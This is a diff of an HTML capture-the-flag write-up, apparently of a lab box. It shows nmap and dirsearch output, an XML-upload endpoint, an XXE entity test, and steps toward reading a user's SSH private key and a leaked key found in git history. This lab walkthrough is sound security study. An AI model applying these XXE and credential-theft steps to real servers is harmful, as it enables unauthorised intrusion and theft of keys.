@@ -45,7 +45,7 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: gunicorn/<span class="hljs-number">19</span>.<span class="hljs-number">7</span>.<span class="hljs-number">1</span>
 Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
 <p>Going to port 5000, get’s s a nice site <em>under construction!</em>.</p>
-<p><img src="/_resources/697df615077541468819ae930667c59b.png" /></p>
+<p><img src=":/697df615077541468819ae930667c59b" alt="2b68d85665030d6656512ffda32e2d6a.png" /></p>
 <p>Running dirsearch finds us <code>/feed</code> and <code>/upload</code>.</p>
 <div><pre class="hljs"><code>Target: http:<span class="hljs-comment">//10.129.164.53:5000/</span>
 <span class="hljs-string">
@@ -53,9 +53,9 @@ Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kern
 <span class="hljs-string">[19:32:05]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">533</span>KB - /feed
 <span class="hljs-string">[19:32:27]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">347</span>B  - /upload</code></pre></div>
 <p>As one could expect, <code>/upload</code> will be our primary target.</p>
-<p><img src="/_resources/964e01640f464432a5831522c988d6d5.png" /></p>
+<p><img src=":/964e01640f464432a5831522c988d6d5" alt="dc75360b0360e3635f3b38c446655b0b.png" /></p>
 <p>Uploading my sample xml file, causes the server to crash.</p>
-<p><img src="/_resources/d8f16d4b89ac4be4ada0e6d85db9f69e.png" /></p>
+<p><img src=":/d8f16d4b89ac4be4ada0e6d85db9f69e" alt="35b68b181c319484c23dc8a1788cc0f7.png" /></p>
 <p>Creating xml as mentioned by the site, returns some kind of blogpost processing response.</p>
 <div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">Document</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span>John Doe<span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span>
@@ -64,9 +64,9 @@ Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kern
         XML (Extensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.
     <span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span></code></pre></div>
-<p><img src="/_resources/4ed067f4db744e32a12b3a89367b50e6.png" /></p>
+<p><img src=":/4ed067f4db744e32a12b3a89367b50e6" alt="9d42130d77ac685862adc42f8d5ff816.png" /></p>
 <p>Going to <code>http://10.129.164.53:5000/uploads/sample-xml-files-sample-4.xml</code> does indeed work.</p>
-<p><img src="/_resources/6af9bb67a26048cbac09df93d261fe70.png" /></p>
+<p><img src=":/6af9bb67a26048cbac09df93d261fe70" alt="456e0dbd7151ffd27aaac6135c8eb2ae.png" /></p>
 <p>We also learn that the files are stored under <code> /home/roosa/deploy/src</code> and now know the name of our victim user <code>roosa</code>. For a recap on testing xml files, checkout <a title="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">hacktricks</a>, as this is where I got my code from. Let’s test if ENTITY declaration is working.</p>
 <div><pre class="hljs"><code><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
 <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">toreplace</span> <span class="hljs-string">"3"</span>&gt;</span> ]&gt;</span>
@@ -89,7 +89,7 @@ Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kern
     <span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span></code></pre></div>
 <p>It works!</p>
-<p><img src="/_resources/d13d94963d8d4a9b91c431289c0693fc.png" /></p>
+<p><img src=":/d13d94963d8d4a9b91c431289c0693fc" alt="bfcbf0ebfab05b6d30bdbe45fc0c5467.png" /></p>
 <p>There are two ways of moving forward. One, just grabbing the id_rsa (<code>/home/roosa/.ssh/id_rsa</code>) of user roosa, that we found earlier. Remember to <code>chmod 600</code> and we are in.</p>
 <p>Second option is to try to abuse <code>feed.py</code>.</p>
 <div><pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploaded_file</span>(<span class="hljs-params">filename</span>):
@@ -187,9 +187,9 @@ d387abf <span class="hljs-keyword">add</span> key <span class="hljs-keyword">for
 resources<span class="hljs-operator">/</span>integration<span class="hljs-operator">/</span>authcredentials.key
 <span class="hljs-number">1422e5</span>a <span class="hljs-keyword">Initial</span> <span class="hljs-keyword">commit</span>
 README.md</code></pre></div>
-<p><img src="/_resources/136406da80434fb890851878974320a1.png" /></p>
+<p><img src=":/136406da80434fb890851878974320a1" alt="2531e55aebee7ce9d9aa383c01f78ae1.png" /></p>
 <p>Logging in with newly obtained ssh key works. Cool box.</p>
-<p><img src="/_resources/52d19bc90d7e40ff8c57c8b8952c4a97.png" /></p>
+<p><img src=":/52d19bc90d7e40ff8c57c8b8952c4a97" alt="34c9562c68a11a08895326f024854fa9.png" /></p>
 </div>
       </article>
     </div>
